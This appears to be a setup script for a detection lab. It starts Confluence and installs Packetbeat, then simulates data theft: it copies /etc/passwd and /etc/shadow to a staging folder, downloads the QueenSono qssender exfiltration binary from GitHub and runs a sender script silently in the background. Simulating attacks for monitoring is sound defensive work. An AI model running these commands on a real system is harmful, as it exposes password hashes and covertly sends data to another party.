
#!/bin/bash

# Start Confluence
/etc/init.d/confluence start

# Setup packetbeat
apt-get install libpcap0.8 -y
curl -L -O https://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-8.3.3-amd64.deb
dpkg -i packetbeat-8.3.3-amd64.deb
cp /vagrant/config/packetbeat/packetbeat.yml /etc/packetbeat/packetbeat.yml
echo "[DEBUG] Waiting for kibana service to up. Sleeping for 120s..."
sleep 120
packetbeat setup
service packetbeat start

# Setup filebeat
# TODO

#[EXFILTRATION]

#Simulate collected files
mkdir /tmp/exfiltrate
cat /etc/passwd > /tmp/exfiltrate/passwd
cat /etc/shadow > /tmp/exfiltrate/shadow
# Setup qsreceiver and qssender
wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
chmod +x /tmp/qssender
cp /vagrant/attack/exfiltration/run_qssender.sh /tmp/run_qssender.sh
chmod +x /tmp/run_qssender.sh
nohup /tmp/run_qssender.sh &>/dev/null &
